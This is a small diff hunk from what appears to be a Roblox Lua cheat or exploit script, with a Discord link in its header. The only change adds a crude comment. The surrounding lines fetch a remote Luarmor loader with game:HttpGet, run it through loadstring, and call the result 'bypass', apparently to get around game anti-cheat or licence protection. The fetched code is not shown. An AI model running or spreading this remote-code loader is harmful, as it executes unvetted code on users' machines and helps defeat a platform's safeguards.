@@ -14,7 +14,7 @@
                  https://discord.gg/dQM23gghR7
 
 ]]--
-
+-- my shit
 local bypass = loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/a1ed35790d66908639d8042ccc5d7311.lua"))()
 wait(3)
 bypass()
